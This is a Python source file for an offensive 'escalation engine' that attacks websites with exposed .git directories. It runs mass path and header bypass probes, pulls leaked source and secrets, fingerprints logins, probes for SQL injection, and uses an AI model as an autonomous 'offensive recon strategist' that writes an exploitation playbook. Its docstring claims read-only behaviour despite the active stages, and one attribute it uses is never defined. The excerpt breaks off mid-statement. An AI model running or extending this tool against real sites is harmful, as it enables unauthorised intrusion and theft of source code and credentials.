"""GitVulture Escalation Engine.

A single, unified post-scan layer that climbs the ladder from the
softest probes to the most aggressive AI-driven probing. Claude
acts as the autonomous orchestrator: it sees every previous result
and decides what to do next.

Ladder (lowest → highest aggression)
------------------------------------
L1.  Hardened .git bypass storm   – 60+ path & header tricks against
                                    every still-unreachable .git asset
                                    (302 / 403 / 404 only).
L2.  Upstream pivot               – If .git/config exposes a remote
                                    (github.com / gitlab.com / bitbucket),
                                    try public clone, search engines and
                                    Wayback for a public mirror.
L3.  Index → endpoint synthesis   – From recovered index file paths, build
                                    a custom wordlist of likely HTTP
                                    endpoints (Controller/AuthController.php
                                    → /api/auth/*) and probe them.
L4.  Hidden file probes           – .env, .env.local, composer.json,
                                    package.json, backup.sql, .svn/entries,
                                    .DS_Store, web.config, robots, sitemap.
L5.  Auth surface fingerprinting  – Probe known login pages, capture CSRF
                                    tokens, identify session cookies,
                                    detect default-creds fingerprints.
L6.  AI autonomous probing loop   – Claude is given the full evidence tape
                                    and asked to propose up to N follow-up
                                    HTTP probes; the engine runs them and
                                    feeds the responses back; repeated until
                                    Claude declares the surface mapped.
L7.  Secret super-scan            – Re-run the secret rules across every
                                    byte we collected during L1-L6 (not just
                                    the git dump).
L8.  Final AI strategy report     – Claude produces a prioritized exploit
                                    playbook combining all evidence.

The engine only issues read-only HTTP requests. No POST / PUT / DELETE
against the target unless the user explicitly enables --offensive (off
by default).
"""
from __future__ import annotations

import asyncio
import json
import os
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Optional
from urllib.parse import urlparse

from emergentintegrations.llm.chat import LlmChat, UserMessage

from .escalation_data import (
    DEFAULT_CREDS,
    EXTREME_HEADER_BYPASS,
    EXTREME_METHODS,
    EXTREME_PATH_BYPASS,
    HIDDEN_PATHS,
    LOGIN_PAGES,
)
from ..secrets.patterns import Finding, dedupe, scan_text
from .aggressive import AggressiveRetriever, Probe, hunt_pack_files, scan_recovered_sources
from .s3_enum import run_s3_enumeration
from .crypto_attack import forge_and_test
from .sqli_probe import probe_sqli
from ..ai.forgery_lab import generate_forgery
from ..logger import get_logger
from .http_client import FetchResult, HttpClient


# ---------------------------------------------------------------------- #
# Hard-coded payloads are now in escalation_data.py
# ---------------------------------------------------------------------- #

# ---------------------------------------------------------------------- #
# Hard-coded payloads are now in escalation_data.py
# Probe is defined in aggressive.py and re-imported above
# ---------------------------------------------------------------------- #


@dataclass
class EscalationStage:
    level: int
    name: str
    started_at: float = 0.0
    finished_at: float = 0.0
    probes: list[Probe] = field(default_factory=list)
    findings: list[Finding] = field(default_factory=list)
    artifacts: dict[str, Any] = field(default_factory=dict)
    notes: list[str] = field(default_factory=list)


@dataclass
class EscalationReport:
    stages: list[EscalationStage] = field(default_factory=list)
    new_findings: list[Finding] = field(default_factory=list)
    ai_strategy: Optional[dict] = None
    pivot_repo: Optional[dict] = None
    forgery_lab: Optional[dict] = None
    summary: dict[str, Any] = field(default_factory=dict)


# ---------------------------------------------------------------------- #
# Engine
# ---------------------------------------------------------------------- #
class EscalationEngine:
    def __init__(
        self,
        client: HttpClient,
        target_url: str,
        scan_artifacts: dict,
        *,
        ai_session_id: str,
        offensive: bool = False,
        out_dir: Optional[Path] = None,
        log=None,
        emit=None,
    ):
        self.client = client
        self.target = target_url.rstrip("/")
        self.artifacts = scan_artifacts
        self.offensive = offensive
        self.out_dir = out_dir or Path("/tmp")
        self.log = log or (lambda *a, **kw: None)
        self.emit = emit  # async callable: dict -> None
        self._ai_session = ai_session_id
        self._api_key = os.environ.get("EMERGENT_LLM_KEY", "")
        self.elog = get_logger()

    async def _send(self, evt: dict):
        if self.emit:
            try:
                await self.emit(evt)
            except Exception:
                pass

    # ------------------------------------------------------------------ #
    # AI helper – non-streaming JSON answer
    # ------------------------------------------------------------------ #
    async def _ask_ai(self, system: str, user: str, *, max_chars: int = 12000) -> dict:
        if not self._api_key:
            return {"error": "EMERGENT_LLM_KEY not set"}
        chat = LlmChat(
            api_key=self._api_key,
            session_id=self._ai_session,
            system_message=system,
        ).with_model("anthropic", "claude-sonnet-4-6")
        try:
            resp = await chat.send_message(UserMessage(text=user[:max_chars]))
        except Exception as e:
            return {"error": f"LLM call failed: {e}"}
        raw = resp if isinstance(resp, str) else getattr(resp, "text", str(resp))
        s = raw.find("{")
        e = raw.rfind("}")
        if s >= 0 and e > s:
            try:
                return json.loads(raw[s : e + 1])
            except Exception:
                pass
        return {"error": "could not parse LLM JSON", "raw": raw[:1500]}

    # ------------------------------------------------------------------ #
    # Stage runners
    # ------------------------------------------------------------------ #
    async def run(self) -> EscalationReport:
        report = EscalationReport()
        await self._send({"type": "esc_phase", "phase": "escalation", "status": "running"})

        for runner, level, name in [
            (self._l1_bypass_storm,         1, "Hardened .git Bypass Storm"),
            (self._l2_upstream_pivot,       2, "Upstream Repository Pivot"),
            (self._l3_endpoint_synthesis,   3, "Index → Endpoint Synthesis"),
            (self._l4_hidden_paths,         4, "Hidden File Probes"),
            (self._l5_auth_fingerprint,     5, "Auth Surface Fingerprint"),
            (self._l6_ai_autonomous_loop,   6, "AI Autonomous Probing"),
            (self._l7_secret_super_scan,    7, "Secret Super-Scan"),
            (self._l9_aggressive_retrieve,  9, "Aggressive Blob Retrieval"),
            (self._l10_pack_hunt,          10, "Pack File Hunt"),
            (self._l11_source_super_scan,  11, "Recovered Source Super-Scan"),
            (self._l12_ai_second_wave,     12, "AI Second-Wave Probing"),
            (self._l13_sqli_probe,         13, "SQL Injection Probing"),
            (self._l14_crypto_attacks,     14, "Crypto Attacks (JWT/Keys)"),
            (self._l15_forgery_lab,        15, "AI Forgery Lab"),
            (self._l16_s3_enum,            16, "AWS S3 Enumeration"),
            (self._l8_final_strategy,       8, "Final AI Strategy"),
        ]:
            # AI-only stages can be skipped via flag (offensive=False keeps L13/L14 read-only)
            requires_ai = level in (6, 8, 12, 15)
            if requires_ai and not self._api_key:
                self.elog.warning(f"L{level} {name}  — skipped (no EMERGENT_LLM_KEY)")
                continue
            stage = EscalationStage(level=level, name=name)
            stage.started_at = asyncio.get_event_loop().time()
            self.elog.phase(f"L{level:02d}  ::  {name.upper()}")
            await self._send({"type": "esc_stage", "level": level, "name": name, "status": "running"})
            try:
                await runner(stage, report)
            except Exception as e:
                stage.notes.append(f"runner error: {e}")
                self.elog.error(f"L{level} runner exception: {e}")
            stage.finished_at = asyncio.get_event_loop().time()
            report.stages.append(stage)
            hits = sum(1 for p in stage.probes if 200 <= p.status < 300 and p.size > 0)
            self.elog.info(
                f"L{level} done  →  {len(stage.probes)} probes, "
                f"{hits} hits, {len(stage.findings)} new findings, "
                f"{stage.finished_at - stage.started_at:.1f}s"
            )
            await self._send({
                "type": "esc_stage", "level": level, "name": name, "status": "done",
                "probes": len(stage.probes),
                "findings": len(stage.findings),
            })

        # Aggregate findings
        all_new: list[Finding] = []
        for st in report.stages:
            all_new.extend(st.findings)
        report.new_findings = dedupe(all_new)
        report.summary = {
            "stages_run": len(report.stages),
            "total_probes": sum(len(s.probes) for s in report.stages),
            "new_findings": len(report.new_findings),
            "hit_count_per_stage": {s.name: sum(1 for p in s.probes if 200 <= p.status < 300 and p.size > 0)
                                    for s in report.stages},
        }
        await self._send({"type": "esc_phase", "phase": "escalation", "status": "done",
                          "data": report.summary})
        return report

    # ------------------------------------------------------------------ #
    # L1: bypass storm on .git assets
    # ------------------------------------------------------------------ #
    async def _l1_bypass_storm(self, stage: EscalationStage, report: EscalationReport):
        # Targets the engine already tried and got 302/403/404 on
        candidates = [
            "objects/info/packs", "objects/info/alternates", "objects/pack/",
            "info/refs", "FETCH_HEAD", "ORIG_HEAD", "MERGE_HEAD",
            "COMMIT_EDITMSG", "REVERT_HEAD",
        ]
        # Also try fetching individual objects we know exist
        index_entries = self.artifacts.get("index_entries", []) or []
        # Pull up to 25 promising blob SHAs (avoid spawning thousands)
        promising = [e for e in index_entries
                     if any(k in e.get("path", "").lower()
                            for k in ("config", ".env", "auth", "lic", "key", "secret",
                                      "controller", "admin", "password"))]
        for e in (promising[:15] or index_entries[:15]):
            sha = e.get("sha1") or ""
            if len(sha) == 40:
                candidates.append(f"objects/{sha[:2]}/{sha[2:]}")
        # commits from refs
        refs = self.artifacts.get("refs") or {}
        for sha in (refs.get("commits") or [])[:6]:
            if isinstance(sha, str) and len(sha) == 40:
                candidates.append(f"objects/{sha[:2]}/{sha[2:]}")

        # Build the probe matrix (path variants × header variants × methods)
        tasks = []
        seen: set[tuple] = set()

        async def probe(method: str, url: str, headers: Optional[dict], bypass_label: str):
            # Inline issue: we cannot use HttpClient.fetch_path here because we
            # want absolute URLs and method override – call _request directly.
            extra = dict(headers) if headers else None
            # Force GET inside HttpClient (it only supports GET via fetch_path),
            # so when method != GET, build a tiny inline request.
            if method == "GET":
                r = await self.client._request(url, extra_headers=extra)
            else:
                # Use raw httpx via client._client_for
                try:
                    cli = self.client._client_for(self.client._next_proxy())
                    h = {"User-Agent": self.client._next_ua()}
                    if extra:
                        h.update(extra)
                    resp = await cli.request(method, url, headers=h, timeout=self.client.timeout)
                    r = FetchResult(url=url, status=resp.status_code,
                                    content=resp.content[:4096], headers=dict(resp.headers))
                except Exception as ex:
                    r = FetchResult(url=url, status=0, error=str(ex))
            p = Probe(method=method, url=url, status=r.status, size=len(r.content),
                       bypass=bypass_label)
            stage.probes.append(p)
            if r.ok and len(r.content) > 0:
                # Try to interpret the body
                head = r.content[:2]
                if head[:1] == b"x" or head[:1] == b"\x78":
                    p.note = "zlib (possible git object)"
                stage.notes.append(f"HIT {p.bypass}  ->  {url}  ({len(r.content)} bytes)")
                # Scan the body for secrets right away
                try:
                    text = r.content.decode("utf-8", errors="replace")
                    stage.findings.extend(scan_text(text, file_path=url, source="escalation-L1"))
                except Exception:
                    pass

        # Path variants for each candidate
        for cand in candidates:
            full_git_path = f".git/{cand}"
            for tmpl in EXTREME_PATH_BYPASS:
                # Replace placeholders
                variant = (tmpl
                           .replace("{p}", full_git_path)
                           .replace("{x}", cand)
                           .replace("{prefix}", ""))
                if not variant.startswith("/"):
                    variant = "/" + variant
                key = ("GET", variant, None)
                if key in seen:
                    continue
                seen.add(key)
                url = f"{self.target}{variant}"
                tasks.append(probe("GET", url, None, f"path:{tmpl[:30]}"))

        # Header variants on the canonical path
        for cand in candidates:
            url = f"{self.target}/.git/{cand}"
            for hdr in EXTREME_HEADER_BYPASS:
                key = ("GET", url, tuple(hdr.items()))
                if key in seen:
                    continue
                seen.add(key)
                tasks.append(probe("GET", url, hdr, f"hdr:{list(hdr.keys())[0]}"))
        # HTTP method variants (only on objects/info/packs as a probe)
        for method in EXTREME_METHODS[1:6]:
            url = f"{self.target}/.git/objects/info/packs"
            tasks.append(probe(method, url, None, f"method:{method}"))

        # Cap to avoid hammering the target
        CAP = 800
        tasks = tasks[:CAP]
        # Run in chunks
        CHUNK = 40
        for i in range(0, len(tasks), CHUNK):
            await asyncio.gather(*tasks[i : i + CHUNK], return_exceptions=True)

        stage.artifacts["total_attempts"] = len(tasks)
        stage.artifacts["successful_hits"] = sum(1 for p in stage.probes
                                                  if 200 <= p.status < 300 and p.size > 0)

    # ------------------------------------------------------------------ #
    # L2: upstream repo pivot
    # ------------------------------------------------------------------ #
    async def _l2_upstream_pivot(self, stage: EscalationStage, report: EscalationReport):
        recon = self.artifacts.get("recon") or {}
        config = recon.get("config_text") or ""
        m = re.search(r"url\s*=\s*([^\n\r]+)", config)
        if not m:
            stage.notes.append("no remote URL in .git/config")
            return
        remote_url = m.group(1).strip()
        # Convert SSH form git@github.com:org/repo.git → https URL
        ssh_m = re.match(r"git@([^:]+):(.+?)(\.git)?$", remote_url)
        if ssh_m:
            host, repo = ssh_m.group(1), ssh_m.group(2)
            if repo.endswith(".git"):
                repo = repo[:-4]
            https_url = f"https://{host}/{repo}"
        elif remote_url.startswith("http"):
            # NOTE: bare rstrip(".git") removes individual chars, not the suffix
            cleaned = remote_url
            if cleaned.endswith(".git"):
                cleaned = cleaned[:-4]
            https_url = cleaned.rstrip("/")
        else:
            stage.notes.append(f"unsupported remote: {remote_url}")
            return

        stage.artifacts["remote_url"] = remote_url
        stage.artifacts["https_candidate"] = https_url
        self.elog.success(f"upstream repo identified: {remote_url}")
        self.elog.success(f"upstream HTTPS URL:       {https_url}")

        # Probe public availability via raw HTTPS GET on the repo landing page
        r = await self.client._request(https_url)
        public = 200 <= r.status < 400 and b"<html" in r.content[:2048].lower()
        stage.probes.append(Probe(method="GET", url=https_url, status=r.status,
                                   size=len(r.content),
                                   note="upstream landing"))
        if public:
            self.elog.success(f"upstream repo is PUBLIC  →  {https_url}")
        else:
            self.elog.warning(f"upstream repo NOT public ({r.status}) — pivoting to org enum")

        # Also probe a couple of "predictable" public-info endpoints
        probes_extra = []
        if "github.com" in https_url:
            owner_repo = https_url.split("github.com/")[-1]
            owner = owner_repo.split("/")[0]
            for p in [
                f"https://api.github.com/repos/{owner_repo}",
                f"https://api.github.com/orgs/{owner}/repos?per_page=100",
                f"https://api.github.com/users/{owner}/repos?per_page=100",
                f"https://web.archive.org/web/2025*/{https_url}",
                f"https://github.com/{owner}",
            ]:
                probes_extra.append(p)
        for u in probes_extra:
            r = await self.client._request(u)
            stage.probes.append(Probe(method="GET", url=u, status=r.status, size=len(r.content),
                                       note="upstream metadata"))
            if r.ok:
                self.elog.success(f"upstream metadata reachable  →  {u}  ({len(r.content)}B)")
                try:
                    text = r.content[:4096].decode("utf-8", errors="replace")
                    # If this is the GitHub API repo list, extract repo names
                    if "api.github.com" in u and "/repos" in u:
                        import json as _json
                        try:
                            repos = _json.loads(r.content.decode("utf-8", "replace"))
                            if isinstance(repos, list):
                                names = [x.get("full_name") for x in repos
                                         if isinstance(x, dict)]
                                stage.artifacts["sibling_repos"] = names
                                for n in names[:10]:
                                    self.elog.info(f"  sibling repo  →  {n}")
                                report.discovered_endpoints.extend(
                                    f"https://github.com/{n}" for n in names
                                )
                        except Exception:
                            pass
                    stage.findings.extend(scan_text(text, file_path=u,
                                                    source="escalation-L2"))
                except Exception:
                    pass

        report.pivot_repo = {
            "remote_url": remote_url,
            "https_candidate": https_url,
            "public_landing": public,
        }
        stage.notes.append(f"upstream public: {public}")

    # ------------------------------------------------------------------ #
    # L3: endpoint synthesis from index
    # ------------------------------------------------------------------ #
    async def _l3_endpoint_synthesis(self, stage: EscalationStage, report: EscalationReport):
        idx = self.artifacts.get("index_entries", []) or []
        if not idx:
            stage.notes.append("no index entries to synthesize endpoints from")
            return
        paths = [e.get("path", "") for e in idx]
        endpoint_candidates: set[str] = set()
        # Common controller-to-endpoint conversions
        for p in paths:
            low = p.lower()
            # Strip leading dirs
            base = low.split("/")[-1].replace(".php", "").replace(".js", "")
            for stem in ("controller", "ctrl"):
                if stem in base:
                    name = base.replace(stem, "").strip("_-")
                    if name:
                        endpoint_candidates.add(f"/api/{name}")
                        endpoint_candidates.add(f"/api/v1/{name}")
                        endpoint_candidates.add(f"/{name}")
                        endpoint_candidates.add(f"/{name}.php")
            # Direct file requests (mirror the index)
            if any(p.endswith(ext) for ext in (".php", ".html", ".js", ".json",
                                                ".txt", ".md")):
                endpoint_candidates.add("/" + p)
            # API hint
            if low.startswith("api/"):
                endpoint_candidates.add("/" + p)
                endpoint_candidates.add("/" + p.replace(".php", ""))

        # Hard cap
        endpoint_candidates = set(list(endpoint_candidates)[:120])
        stage.artifacts["endpoint_candidates"] = sorted(endpoint_candidates)
        self.elog.info(f"synthesized {len(endpoint_candidates)} endpoint candidates from index")

        async def probe(path: str):
            url = f"{self.target}{path}"
            r = await self.client._request(url)
            p = Probe(method="GET", url=url, status=r.status, size=len(r.content))
            stage.probes.append(p)
            if r.ok and len(r.content) > 32:
                self.elog.success(f"endpoint LIVE  {r.status}  {url}  ({len(r.content)}B)")
                try:
                    text = r.content[:6000].decode("utf-8", errors="replace")
                    stage.findings.extend(scan_text(text, file_path=url,
                                                    source="escalation-L3"))
                except Exception:
                    pass
            elif r.status in (401, 403):
                self.elog.warning(f"endpoint GATED {r.status}  {url}")

        tasks = [probe(p) for p in endpoint_candidates]
        for i in range(0, len(tasks), 30):
            await asyncio.gather(*tasks[i : i + 30], return_exceptions=True)

    # ------------------------------------------------------------------ #
    # L4: hidden file probes
    # ------------------------------------------------------------------ #
    async def _l4_hidden_paths(self, stage: EscalationStage, report: EscalationReport):
        async def probe(path: str):
            url = f"{self.target}/{path}"
            r = await self.client._request(url)
            p = Probe(method="GET", url=url, status=r.status, size=len(r.content))
            stage.probes.append(p)
            if r.ok and len(r.content) > 0:
                stage.notes.append(f"HIT {url} ({len(r.content)} bytes)")
                self.elog.success(f"hidden path  {r.status}  {url}  ({len(r.content)}B)")
                try:
                    text = r.content[:8000].decode("utf-8", errors="replace")
                    stage.findings.extend(scan_text(text, file_path=url,
                                                    source="escalation-L4"))
                except Exception:
                    pass
        tasks = [probe(p) for p in HIDDEN_PATHS]
        for i in range(0, len(tasks), 25):
            await asyncio.gather(*tasks[i : i + 25], return_exceptions=True)

    # ------------------------------------------------------------------ #
    # L5: auth fingerprint
    # ------------------------------------------------------------------ #
    async def _l5_auth_fingerprint(self, stage: EscalationStage, report: EscalationReport):
        found_login: list[dict] = []
        for path in LOGIN_PAGES:
            url = f"{self.target}{path}"
            r = await self.client._request(url)
            stage.probes.append(Probe(method="GET", url=url, status=r.status,
                                       size=len(r.content)))
            if r.ok and r.content:
                body = r.content.decode("utf-8", errors="replace")[:8000]
                has_login = bool(re.search(
                    r"<input[^>]*name=[\"'](password|passwd|pwd)[\"']", body, re.I))
                csrf = re.search(
                    r"<input[^>]*name=[\"'](csrf_?token|_token|authenticity_token)[\"'][^>]*value=[\"']([^\"']+)",
                    body, re.I,
                )
                cookie_names = re.findall(r"\b(set-cookie):\s*([^;]+)",
                                           "\n".join(f"{k}: {v}" for k, v in
                                                     r.headers.items()), re.I)
                # Note framework hints
                framework_hints = []
                for sig in ("phpsessid", "jsessionid", "laravel_session",
                            "wp-", "django", "flask", "express"):
                    if sig in body.lower() or any(sig in c.lower() for c in cookie_names):
                        framework_hints.append(sig)
                if has_login:
                    found_login.append({
                        "url": url,
                        "csrf_token": csrf.group(2) if csrf else None,
                        "framework_hints": framework_hints,
                    })
                    stage.notes.append(f"login form @ {url}")
                    self.elog.success(
                        f"login form discovered  →  {url}  "
                        f"(framework: {', '.join(framework_hints) or '?'}"
                        f"{', CSRF token' if csrf else ''})"
                    )

        stage.artifacts["login_pages"] = found_login

        # NOTE: We never POST credentials unless --offensive is on. We only
        # FINGERPRINT and let the AI / user decide what to do with them.
        if self.offensive and found_login:
            stage.notes.append("--offensive enabled: default-cred probes (POST) would be issued here.")
            # Implementation left out by design (legal safety).
            # If you ship offensive mode, this is where you'd POST DEFAULT_CREDS.

    # ------------------------------------------------------------------ #
    # L6: AI autonomous probing loop
    # ------------------------------------------------------------------ #
    async def _l6_ai_autonomous_loop(self, stage: EscalationStage, report: EscalationReport):
        # Compact evidence summary from all prior stages
        prior_hits = []
        for st in report.stages:
            for p in st.probes:
                if 200 <= p.status < 300 and p.size > 0:
                    prior_hits.append({
                        "url": p.url, "status": p.status, "size": p.size,
                        "bypass": p.bypass, "note": p.note,
                    })
        evidence = {
            "target": self.target,
            "recon": self.artifacts.get("recon") or {},
            "index_paths": [e.get("path") for e in
                            (self.artifacts.get("index_entries") or [])[:60]],
            "branches": (self.artifacts.get("refs") or {}).get("branches") or {},
            "pivot": report.pivot_repo,
            "hits_so_far": prior_hits[:80],
            "stages_completed": [s.name for s in report.stages],
        }
        system = (
            "You are an offensive recon strategist driving an autonomous HTTP "
            "probe loop. Look at the evidence and emit up to 25 NEW read-only "
            "GET URLs (absolute, from the target's origin) that have the "
            "highest chance of leaking source code, secrets, or auth "
            "material based on the recovered file tree. Return strict JSON: "
            '{"probes": ["https://..","https://..", ...], "reasoning": "..."}'
        )
        ai_resp = await self._ask_ai(system, json.dumps(evidence, default=str))
        stage.artifacts["ai_proposal"] = ai_resp
        probes = ai_resp.get("probes") or []
        # Sanity filter
        probes = [u for u in probes if isinstance(u, str)
                  and u.startswith(("http://", "https://"))
                  and urlparse(u).hostname and urlparse(u).hostname in self.target]
        probes = probes[:25]

        async def run_probe(u: str):
            r = await self.client._request(u)
            p = Probe(method="GET", url=u, status=r.status, size=len(r.content),
                       note="AI-proposed")
            stage.probes.append(p)
            if r.ok and len(r.content) > 0:
                try:
                    text = r.content[:8000].decode("utf-8", errors="replace")
                    stage.findings.extend(scan_text(text, file_path=u,
                                                    source="escalation-L6"))
                except Exception:
                    pass

        if probes:
            await asyncio.gather(*(run_probe(u) for u in probes),
                                  return_exceptions=True)

    # ------------------------------------------------------------------ #
    # L7: secret super-scan on everything we've grabbed
    # ------------------------------------------------------------------ #
    async def _l7_secret_super_scan(self, stage: EscalationStage, report: EscalationReport):
        # Re-scan every HIT body from earlier stages.
        # Bodies aren't stored; instead we re-fetch the successful URLs and
        # apply the secret rules with extended context.
        successful: list[str] = []
        for st in report.stages:
            for p in st.probes:
                if 200 <= p.status < 300 and p.size > 0:
                    successful.append(p.url)
        successful = list(dict.fromkeys(successful))[:100]
        async def scan_one(url: str):
            r = await self.client._request(url)
            if r.ok and r.content:
                try:
                    text = r.content[:200_000].decode("utf-8", errors="replace")
                except Exception:
                    return
                stage.findings.extend(scan_text(text, file_path=url,
                                                source="escalation-L7"))
        if successful:
            await asyncio.gather(*(scan_one(u) for u in successful),
                                  return_exceptions=True)
        stage.artifacts["scanned_urls"] = len(successful)

    # ------------------------------------------------------------------ #
    # L8: final AI strategy
    # ------------------------------------------------------------------ #
    async def _l8_final_strategy(self, stage: EscalationStage, report: EscalationReport):
        # Build a digest
        all_hits = []
        for st in report.stages:
            for p in st.probes:
                if 200 <= p.status < 300 and p.size > 0:
                    all_hits.append({
                        "stage": st.name, "url": p.url, "size": p.size,
                        "bypass": p.bypass, "note": p.note,
                    })
        digest = {
            "target": self.target,
            "recon": self.artifacts.get("recon") or {},
            "refs": (self.artifacts.get("refs") or {}).get("branches"),
            "index_paths": [e.get("path") for e in
                            (self.artifacts.get("index_entries") or [])[:80]],
            "pivot_repo": report.pivot_repo,
            "total_probes": sum(len(s.probes) for s in report.stages),
            "hits": all_hits[:60],
            "new_findings": [
                {"rule": f.rule_id, "sev": f.severity, "file": f.file_path,
                 "redacted": f.redacted}
                for f in (report.new_findings or [])[:30]
            ],
        }
        system = (
            "You are a senior offensive security lead writing the FINAL "
            "exploitation playbook after an 8-stage automated escalation "
            "engine has run against the target. Use the evidence to produce "
            "STRICT JSON with this schema:\n"
            "{\n"
            '  "verdict": "compromise|partial|metadata-only|no-go",\n'
            '  "risk_score": <int 0-100>,\n'
            '  "narrative": "<5-8 sentences explaining what this target is, '
            'what we learned, and what an attacker would do next>",\n'
            '  "kill_chain": [\n'
            '    {"step": 1, "action": "...", "evidence": "...", "outcome": "..."},\n'
            "    ...\n"
            "  ],\n"
            '  "top_recommendations": ["..", ".."],\n'
            '  "stop_reasons": ["why automation could not go further"]\n'
            "}\n"
            "No prose outside the JSON."
        )
        ai_resp = await self._ask_ai(system, json.dumps(digest, default=str),
                                      max_chars=20000)
        report.ai_strategy = ai_resp
        stage.artifacts["ai_strategy"] = ai_resp

    # ------------------------------------------------------------------ #
    # L9: Aggressive blob retrieval — try 80+ bypass variants per blob
    # ------------------------------------------------------------------ #
    async def _l9_aggressive_retrieve(self, stage: EscalationStage, report: EscalationReport):
        idx = self.artifacts.get("index_entries", []) or []
        if not idx:
            stage.notes.append("no index entries to retrieve")
            return
        # Tuples of (sha, path) — prioritize sensitive-sounding files
        sensitive_kw = ("config", ".env", "auth", "password", "secret", "key",
                        "credential", "license", "lic", "admin", "database",
                        "settings", "controller", "bootstrap", "init", "install")
        blobs = sorted(
            ((e.get("sha1"), e.get("path")) for e in idx
             if e.get("sha1") and len(e.get("sha1") or "") == 40),
            key=lambda x: 0 if any(k in (x[1] or "").lower() for k in sensitive_kw) else 1,
        )
        retriever = AggressiveRetriever(self.client, self.target, self.out_dir,
                                         log=self.log)
        ar = await retriever.retrieve(blobs[:60])
        # Synthesize probe entries for the report
        for h in ar.hits:
            stage.probes.append(Probe(method="GET",
                                       url=f"{self.target}/.git/objects/{h.sha[:2]}/{h.sha[2:]}",
                                       status=200, size=h.size, bypass=h.bypass,
                                       note=f"{h.obj_type}: {h.path}"))
        for sha in ar.failed_shas:
            stage.probes.append(Probe(method="GET",
                                       url=f"{self.target}/.git/objects/{sha[:2]}/{sha[2:]}",
                                       status=302, size=0, bypass="all-failed"))
        stage.artifacts["blobs_recovered"] = len(ar.hits)
        stage.artifacts["files_saved"] = list(ar.files_saved.keys())
        stage.artifacts["failed_count"] = len(ar.failed_shas)
        stage.notes.append(f"recovered {len(ar.hits)}/{len(blobs)} blobs to "
                            f"{self.out_dir}/recovered_source/")

    # ------------------------------------------------------------------ #
    # L10: pack-file hunt
    # ------------------------------------------------------------------ #
    async def _l10_pack_hunt(self, stage: EscalationStage, report: EscalationReport):
        refs = self.artifacts.get("refs") or {}
        shas = list(refs.get("commits") or [])[:30]
        probes = await hunt_pack_files(self.client, self.target, shas, self.out_dir,
                                        log=self.log)
        stage.probes.extend(probes)
        hits = sum(1 for p in probes if 200 <= p.status < 300 and p.size > 0)
        stage.artifacts["pack_hits"] = hits

    # ------------------------------------------------------------------ #
    # L11: super-scan of recovered source tree
    # ------------------------------------------------------------------ #
    async def _l11_source_super_scan(self, stage: EscalationStage,
                                      report: EscalationReport):
        source_dir = self.out_dir / "recovered_source"
        finds = scan_recovered_sources(source_dir)
        stage.artifacts["files_scanned"] = sum(
            1 for _ in source_dir.rglob("*") if _.is_file()) if source_dir.exists() else 0
        # Convert dict findings to Finding objects for downstream merging
        for fd in finds:
            stage.findings.append(Finding(
                rule_id=fd["rule_id"], severity=fd["severity"],
                description=fd["description"], match=fd["match"],
                redacted=fd["redacted"], line=fd["line"], line_no=fd["line_no"],
                file_path=fd["file_path"], commit_sha=None,
                source="L11-recovered-source",
            ))
        stage.notes.append(f"scanned {stage.artifacts['files_scanned']} recovered files; "
                            f"found {len(finds)} new secrets")

    # ------------------------------------------------------------------ #
    # L12: AI second-wave probing based on recovered source
    # ------------------------------------------------------------------ #
    async def _l12_ai_second_wave(self, stage: EscalationStage,
                                   report: EscalationReport):
        # Provide AI with a fresh look at recovered source SNIPPETS + earlier
        # findings, and ask for 25 more high-yield URLs.
        source_dir = self.out_dir / "recovered_source"
        snippets: list[dict] = []
        if source_dir.exists():
            for p in list(source_dir.rglob("*"))[:30]:
                if p.is_file() and p.stat().st_size < 200_000:
                    try:
                        text = p.read_text(encoding="utf-8", errors="replace")[:6000]
                    except Exception:
                        continue
                    snippets.append({"path": str(p.relative_to(source_dir)),
                                      "preview": text[:4000]})
        digest = {
            "target": self.target,
            "recovered_files": [s["path"] for s in snippets],
            "recovered_snippets": snippets[:10],
            "new_findings_so_far": [
                {"rule": f.rule_id, "sev": f.severity, "file": f.file_path,
                 "redacted": f.redacted}
                for st in report.stages for f in (st.findings or [])
            ][:30],
        }
        system = (
            "You are now in WAVE 2 of an autonomous escalation. The first "
            "wave recovered source code from a git leak. Examine the "
            "snippets, find endpoint paths, route names, hidden tokens, "
            "next-stage hints in the application logic, and propose up to "
            "25 NEW GET URLs to probe. Look especially for: admin panels, "
            "stage-progression hints, lab-completion endpoints, API "
            "versions, debug routes, backup files mentioned in code. "
            "Return STRICT JSON: "
            '{"probes":["https://target/..."], "reasoning":"..."}'
        )
        ai_resp = await self._ask_ai(system, json.dumps(digest, default=str),
                                      max_chars=20000)
        stage.artifacts["ai_proposal"] = ai_resp
        probes = ai_resp.get("probes") or []
        # Sanitize
        from urllib.parse import urlparse as _up
        tgt_host = _up(self.target).hostname
        probes = [u for u in probes if isinstance(u, str)
                  and u.startswith(("http://", "https://"))
                  and _up(u).hostname == tgt_host][:25]

        async def run_probe(u: str):
            r = await self.client._request(u)
            p = Probe(method="GET", url=u, status=r.status, size=len(r.content),
                       note="AI-wave2")
            stage.probes.append(p)
            if r.ok and len(r.content) > 0:
                try:
                    text = r.content[:10000].decode("utf-8", errors="replace")
                    stage.findings.extend(scan_text(text, file_path=u,
                                                    source="L12-wave2"))
                except Exception:
                    pass
        if probes:
            await asyncio.gather(*(run_probe(u) for u in probes),
                                  return_exceptions=True)

    # ------------------------------------------------------------------ #
    # L13: SQL Injection probing (active)
    # ------------------------------------------------------------------ #
    async def _l13_sqli_probe(self, stage: EscalationStage,
                              report: EscalationReport):
        candidates: list[str] = []
        for st in report.stages:
            for p in st.probes:
                if 200 <= p.status < 300 and p.size > 0:
                    if any(seg in p.url.lower()
                           for seg in (".php", "/api/", "?", "id=", "user=", "login")):
                        candidates.append(p.url)
        for known in ("/login.php", "/index.php", "/newlicense.php",
                       "/viewlicenses.php", "/api/", "/api/index.php",
                       "/api/login", "/api/users", "/api/lic"):
            candidates.append(f"{self.target}{known}")
        candidates = list(dict.fromkeys(candidates))[:30]
        stage.artifacts["candidates"] = candidates
        if not candidates:
            stage.notes.append("no candidate endpoints")
            return
        rep = await probe_sqli(self.client, candidates, log=self.log)
        stage.artifacts["candidates_probed"] = len(candidates)
        stage.artifacts["probes_sent"] = rep.probes_sent
        stage.artifacts["sqli_findings"] = len(rep.findings)
        for sf in rep.findings:
            stage.findings.append(Finding(
                rule_id=f"sqli-{sf.technique}",
                severity=sf.severity,
                description=f"SQL injection ({sf.technique}) on {sf.endpoint}",
                match=sf.payload[:200], redacted=sf.payload[:200],
                line=sf.evidence[:240], line_no=0,
                file_path=sf.endpoint, source="L13-sqli",
                extra={"parameter": sf.param, "technique": sf.technique},
            ))
        stage.probes.extend([Probe(method="GET", url=u, status=200,
                                     size=1, bypass="sqli-baseline")
